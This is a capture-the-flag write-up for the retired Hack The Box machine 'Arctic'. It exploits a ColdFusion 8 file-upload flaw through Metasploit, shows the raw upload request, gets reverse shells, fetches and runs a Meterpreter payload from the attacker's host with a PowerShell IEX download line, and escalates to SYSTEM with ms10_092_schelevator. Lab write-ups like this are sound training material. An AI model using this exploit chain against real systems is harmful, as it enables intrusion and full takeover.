# Arctic

This is the write-up for the box Arctic that got retired at the 7th July 2017.
My IP address was 10.10.14.13 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.11    arctic.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/arctic.nmap 10.10.10.11
```

```markdown
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking Port 8500

Browsing to port 8500 gives us an index page with two folders called _CFIDE_ and _cfdocs_.
In the path _CFIDE/administrator/_ we get forwarded to a web page that displays a login prompt for **Adobe Coldfusion 8**.

Looking for vulnerabilities shows an **ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)** for this version of Adobe Coldfusion that has a Metasploit module we are going to use.

```markdown
searchsploit coldfusion
```

In Metasploit we can use the module now:
```markdown
use exploit/windows/http/coldfusion_fckeditor

set RHOSTS 10.10.10.11

set RPORT 8500
```

As the server responds very slowly to requests and the payload does not wait for long, this will fail.
Let us examine why this fails by sending the request through _Burpsuite_.

**Burpsuite**:
Proxy --> Options --> Add Proxy Listener
- Bind to port: 8500
- Bind to address: 127.0.0.1
- Redirect to host: 10.10.10.11
- Redirect to port: 8500

Now we can browse to _localhost:8500_ to execute the Metasploit payload locally and examine the traffic in Burpsuite.
```markdown
set RHOSTS 127.0.0.1
```

The POST request we are sending looks like this:
```markdown
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/G.jsp%00 HTTP/1.1
Host: 127.0.0.1:8500
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: multipart/form-data; boundary=_Part_559_3663607441_2109420688
Content-Length: 1588
Connection: close

--_Part_559_3663607441_2109420688
Content-Disposition: form-data; name="newfile"; filename="KCNKUAKE.txt"
Content-Type: application/x-java-archive

(...payload code...)
```

The problem is the **NULL Byte** at the end of the folder (G.jsp%00) that terminates the request before the filename (KCNKUAKE.txt) can be created.
The response is:
```markdown
window.parent.OnUploadCompleted( 0, "/userfiles/file/G.jsp/KCNKUAKE.txt", "KCNKUAKE.txt", "0" );
```

If we manually navigate to the path _10.10.10.11:8500/userfiles/file/G.jsp_ and start a listener on port 4444 we will get a reverse shell if we wait a while.

## Privilege Escalation

Now we have a session on the box with the user _tolis_.
As we still want a Meterpreter session we will create a payload with _Magic Unicorn_ and upload that to the box.
```markdown
/usr/share/unicorn-magic/unicorn.py windows/meterpreter/reverse_tcp 10.10.14.13 9001
```

This will create a payload file with Powershell code in it called **powershell_attack.txt** and a file called **unicorn.rc** which is used so Metasploit loads all the correct commands for this payload.
```markdown
msfconsole -r unicorn.rc
```

To execute the payload code we start a web server on our local machine and download it from the box with Powershell:
```markdown
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13:8000/exploit.txt')"
```

After executing this, the file will be downloaded from the box and executed. This will start a meterpreter session on Metasploit.

Now we can use the _local_exploit_suggester module_ to enumerate for vulnerabilites:
```markdown
use post/multi/recon/local_exploit_suggester
```

We will use the suggested exploit _exploit/windows/local/ms10_092_schelevator_ tp escalate our privileges:
```markdown
use exploit/windows/local/ms10_092_schelevator

set session 1

run
```

When this exploit finishes we get a session back as _NT Authority/SYSTEM_ and finished the box!
